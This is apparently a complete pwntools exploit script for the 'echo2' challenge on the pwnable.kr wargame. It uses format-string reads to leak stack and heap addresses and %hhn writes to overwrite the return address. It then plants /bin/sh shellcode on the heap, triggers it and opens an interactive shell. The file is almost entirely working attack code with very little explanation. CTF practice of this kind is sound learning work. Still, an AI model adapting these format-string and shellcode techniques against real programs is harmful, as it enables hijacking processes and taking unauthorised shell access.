from pwn import *

host = '0'
host = 'pwnable.kr'
#conn = process('./echo2')
conn = connect(host, 9011)

nombre = 'physics'


# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = 'A' * 4 + "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

objo = 0x602098

def main():
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	# get ret addr on stack frame
	conn.sendline('2')
	conn.recvuntil(nombre)
	conn.sendline('%9$p')
	conn.recvline()
	line = conn.recvline()
	leak = int(line[2:], 16)
	print 'stack leak:' + hex(leak)
	ret_addr = leak - 216
	print 'main ret addr:' + hex(ret_addr)
	print ''
	conn.recvuntil('> ')

	# get shellcode addr
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload = '%7$s    ' + p64(objo)
	conn.sendline( payload )
	conn.recvline()
	line = conn.recv(4)
	if line[-1] == '\x20':
		line = line[:-1] + '\x00'
	leak = line + '\x00' * 4
	leak = u64(leak)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 0x30 + 4
	if len(hex(shellcode_addr)) > 8:
		print 'try again'
		return
	print 'shellcode addr:' + hex(shellcode_addr)
	print ''
	conn.recvuntil('> ')

	# overwrite ret addr
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload  = '%7$lln  '
	payload += p64(ret_addr)
	conn.sendline( payload )
	conn.recvuntil('> ')

	sh_bytes = hex(shellcode_addr)[2:]
	b1 = (2, int(sh_bytes[0:2], 16))
	b2 = (1, int(sh_bytes[2:4], 16))
	b3 = (0, int(sh_bytes[4:6], 16))
	sh_bytes = [b1, b2, b3]
	#sh_bytes.sort(key=lambda x: x[1])

	for sh_byte in sh_bytes:
		pos, lenght = sh_byte
		if lenght < 8:
			print 'try again'
			return
		else:
			conn.sendline('2')
			conn.recvuntil(nombre)
			print 'escribo:' + hex(lenght)
			extra = len(str(lenght))
			payload  = '%{:d}x'.format(lenght - (8 - extra))
			payload += ' ' * (8 - extra)
			payload += '%8$hhn'
			payload += p64(ret_addr +  pos)
			conn.sendline( payload )
			conn.recvuntil('> ')

	# place shellcode on heap
	conn.sendline('3')
	conn.sendline(shellcode)
	conn.recvuntil('> ')

	# trigger shellcode
	conn.sendline('4')
	conn.sendline('y')
	conn.recvuntil('bye')
	conn.interactive()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass

#malloc = 0x017086a0
#leak   = 0x01708260
